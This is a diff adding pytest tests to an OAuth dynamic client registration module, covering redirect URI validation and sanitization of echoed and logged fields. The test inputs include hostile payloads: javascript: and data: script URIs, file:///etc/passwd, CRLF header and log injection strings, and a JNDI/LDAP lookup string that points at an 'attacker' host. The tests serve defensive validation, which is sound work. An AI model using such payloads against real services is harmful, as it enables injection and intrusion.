@@ -10,7 +10,7 @@ from starlette.testclient import TestClient
 from starlette.applications import Starlette
 from starlette.routing import Route
 
-from realize.oauth.dcr import handle_client_registration, DCRError
+from realize.oauth.dcr import handle_client_registration, DCRError, MAX_REDIRECT_URI_LEN
 from realize.oauth.routes import register_handler
 
 
@@ -131,8 +131,13 @@ class TestDCRValidation:
         assert response["redirect_uris"] == ["http://127.0.0.1:8080/callback"]
 
     def test_allows_custom_scheme_redirect(self):
+        """Bare custom schemes (e.g., myapp://, cursor://) are permitted for native apps."""
         response = self._register({"redirect_uris": ["myapp://callback"]})
         assert response["redirect_uris"] == ["myapp://callback"]
+
+    def test_allows_cursor_ide_scheme(self):
+        response = self._register({"redirect_uris": ["cursor://anysphere.cursor-mcp/oauth/callback"]})
+        assert response["redirect_uris"] == ["cursor://anysphere.cursor-mcp/oauth/callback"]
 
     def test_rejects_http_non_loopback_redirect(self):
         with pytest.raises(DCRError) as exc_info:
@@ -145,6 +150,107 @@ class TestDCRValidation:
                 "http://localhost:3000/cb",
                 "http://attacker.com/steal",
             ]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    # --- SAY-03: dangerous schemes, malformed, whitespace ---
+
+    def test_allows_ipv6_loopback_redirect(self):
+        response = self._register({"redirect_uris": ["http://[::1]:3000/cb"]})
+        assert response["redirect_uris"] == ["http://[::1]:3000/cb"]
+
+    def test_allows_reverse_dns_custom_scheme(self):
+        response = self._register({"redirect_uris": ["com.example.app://cb"]})
+        assert response["redirect_uris"] == ["com.example.app://cb"]
+
+    def test_rejects_javascript_scheme(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["javascript:alert(1)"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_data_scheme(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["data:text/html,<script>x</script>"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_file_scheme(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["file:///etc/passwd"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_vbscript_scheme(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["vbscript:msgbox(1)"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_blob_scheme(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["blob:https://evil/abc"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_about_scheme(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["about:blank"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_view_source_scheme(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["view-source:https://evil"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_uppercase_dangerous_scheme(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["JAVASCRIPT:alert(1)"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_empty_uri(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": [""]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_uri_missing_scheme(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["foobar"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_uri_with_space(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["https://x/p ath"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_uri_with_leading_whitespace(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": [" https://x/cb"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_non_string_uri(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": [123]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_uri_with_fragment(self):
+        """RFC 7591 §2: redirect_uris MUST NOT include a fragment component."""
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["https://app.example.com/cb#frag"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_rejects_https_without_host(self):
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": ["https:///path"]})
+        assert exc_info.value.error_code == "invalid_redirect_uri"
+
+    def test_allows_redirect_uri_at_max_len(self):
+        prefix = "https://example.com/"
+        uri = prefix + ("a" * (MAX_REDIRECT_URI_LEN - len(prefix)))
+        assert len(uri) == MAX_REDIRECT_URI_LEN
+        response = self._register({"redirect_uris": [uri]})
+        assert response["redirect_uris"] == [uri]
+
+    def test_rejects_redirect_uri_too_long(self):
+        prefix = "https://example.com/"
+        uri = prefix + ("a" * (MAX_REDIRECT_URI_LEN + 1 - len(prefix)))
+        assert len(uri) == MAX_REDIRECT_URI_LEN + 1
+        with pytest.raises(DCRError) as exc_info:
+            self._register({"redirect_uris": [uri]})
         assert exc_info.value.error_code == "invalid_redirect_uri"
 
     # --- grant_types ---
@@ -383,3 +489,96 @@ class TestRegisterRouteHandler:
             assert "client_id" in data
             assert "client_id_issued_at" in data
             assert "client_secret" not in data
+
+
+class TestRegisterSanitization:
+    """Tests for SAY-01 pentest blocker: sanitize echoed/logged strings."""
+
+    def _app(self):
+        return Starlette(routes=[Route("/register", register_handler, methods=["POST"])])
+
+    def test_strips_crlf_from_echoed_client_name(self):
+        with patch("realize.oauth.dcr.config") as mock_config:
+            mock_config.oauth_dcr_client_id = "test-client-id"
+            client = TestClient(self._app())
+            response = client.post("/register", json={
+                "client_name": "evil\r\nSet-Cookie: x=1",
+                "redirect_uris": ["http://localhost:3000/cb"],
+            })
+            assert response.status_code == 201
+            assert response.json()["client_name"] == "evilSet-Cookie: x=1"
+
+    def test_strips_crlf_from_redirect_uri_before_validation(self):
+        """CRLF-smuggled HTTPS URI should be stripped then pass validation."""
+        with patch("realize.oauth.dcr.config") as mock_config:
+            mock_config.oauth_dcr_client_id = "test-client-id"
+            client = TestClient(self._app())
+            response = client.post("/register", json={
+                "redirect_uris": ["https://app.example.com/cb\r\nInjected"],
+            })
+            assert response.status_code == 201
+            assert response.json()["redirect_uris"] == ["https://app.example.com/cbInjected"]
+
+    def test_strips_jndi_from_echoed_field(self):
+        with patch("realize.oauth.dcr.config") as mock_config:
+            mock_config.oauth_dcr_client_id = "test-client-id"
+            client = TestClient(self._app())
+            response = client.post("/register", json={
+                "client_name": "${jndi:ldap://attacker/x}",
+                "redirect_uris": ["http://localhost:3000/cb"],
+            })
+            assert response.status_code == 201
+            assert response.json()["client_name"] == ""
+
+    def test_strips_ansi_from_error_description(self):
+        """Invalid token_endpoint_auth_method with ANSI escape; error body must be clean."""
+        with patch("realize.oauth.dcr.config") as mock_config:
+            mock_config.oauth_dcr_client_id = "test-client-id"
+            client = TestClient(self._app())
+            response = client.post("/register", json={
+                "token_endpoint_auth_method": "basic\x1b[31m",
+            })
+            assert response.status_code == 400
+            desc = response.json()["error_description"]
+            assert "\x1b" not in desc
+            assert "\r" not in desc and "\n" not in desc
+
+    def test_sanitizes_user_agent_in_log(self, caplog):
+        with patch("realize.oauth.dcr.config") as mock_config:
+            mock_config.oauth_dcr_client_id = "test-client-id"
+            client = TestClient(self._app())
+            with caplog.at_level(logging.INFO, logger="realize.oauth.routes"):
+                response = client.post(
+                    "/register",
+                    json={"redirect_uris": ["http://localhost:3000/cb"]},
+                    headers={"user-agent": "evil\r\nInjected: 1"},
+                )
+            assert response.status_code == 201
+            log_record = next(r for r in caplog.records if "dcr_register" in r.message)
+            assert log_record.user_agent == "evilInjected: 1"
+
+    def test_sanitizes_logged_client_name(self, caplog):
+        with patch("realize.oauth.dcr.config") as mock_config:
+            mock_config.oauth_dcr_client_id = "test-client-id"
+            client = TestClient(self._app())
+            with caplog.at_level(logging.INFO, logger="realize.oauth.routes"):
+                response = client.post("/register", json={
+                    "client_name": "name\r\nfake log line",
+                    "redirect_uris": ["http://localhost:3000/cb"],
+                })
+            assert response.status_code == 201
+            log_record = next(r for r in caplog.records if "dcr_register" in r.message)
+            assert log_record.client_name == "namefake log line"
+
+    def test_rejects_deeply_nested_body(self):
+        """Stack-safety: deeply nested JSON body must yield 400, not 500/RecursionError."""
+        from realize.oauth.sanitize import MAX_DEPTH
+        with patch("realize.oauth.dcr.config") as mock_config:
+            mock_config.oauth_dcr_client_id = "test-client-id"
+            client = TestClient(self._app())
+            body: dict = {"n": "leaf"}
+            for _ in range(MAX_DEPTH + 5):
+                body = {"n": body}
+            response = client.post("/register", json=body)
+            assert response.status_code == 400
+            assert response.json()["error"] == "invalid_request"
